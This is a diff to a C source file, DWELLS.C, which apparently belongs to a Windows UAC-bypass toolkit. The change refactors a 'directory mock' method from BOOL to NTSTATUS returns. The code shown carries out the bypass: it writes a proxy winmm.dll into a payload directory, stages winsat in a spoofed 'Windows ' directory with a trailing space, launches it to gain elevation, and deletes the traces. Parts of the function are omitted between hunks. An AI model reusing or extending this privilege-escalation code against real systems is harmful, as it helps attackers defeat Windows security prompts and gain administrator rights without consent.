@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2018
+*  (C) COPYRIGHT AUTHORS, 2018 - 2019
 *
 *  TITLE:       DWELLS.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.17
 *
-*  DATE:        23 Nov 2018
+*  DATE:        18 Mar 2019
 *
 *  David Wells based method.
 *
@@ -29,12 +29,12 @@
 * UAC bypass abusing GetLongPathNameW behavior during AIS.
 *
 */
-BOOL ucmDirectoryMockMethod(
+NTSTATUS ucmDirectoryMockMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL                bCond = FALSE, bResult = FALSE;
+    NTSTATUS            MethodResult = STATUS_ACCESS_DENIED;
     HANDLE              hFakeWindows = NULL;
     UNICODE_STRING      usDirectoryName;
     OBJECT_ATTRIBUTES   ObjectAttributes;
@@ -61,7 +61,7 @@ BOOL ucmDirectoryMockMethod(
         _strcpy(szDest, szPayloadDir);
         _strcat(szDest, WINMM_DLL);
         if (!supWriteBufferToFile(szDest, ProxyDll, ProxyDllSize))
-            return bResult;
+            break;
 
         //
         // Copy winsat to %temp%\system32
@@ -115,9 +115,10 @@ BOOL ucmDirectoryMockMethod(
         _strncpy(szSource, 4, g_ctx->szSystemRoot, 4);
         _strcat(szSource, L"Windows \\system32\\");
         _strcat(szSource, WINSAT_EXE);
-        bResult = supRunProcess(szSource, NULL);
+        if (supRunProcess(szSource, NULL))
+            MethodResult = STATUS_SUCCESS;
 
-    } while (bCond);
+    } while (FALSE);
 
     //
     // Cleanup.
@@ -146,5 +147,5 @@ BOOL ucmDirectoryMockMethod(
 
         NtDeleteFile(&ObjectAttributes);
     }
-    return bResult;
+    return MethodResult;
 }
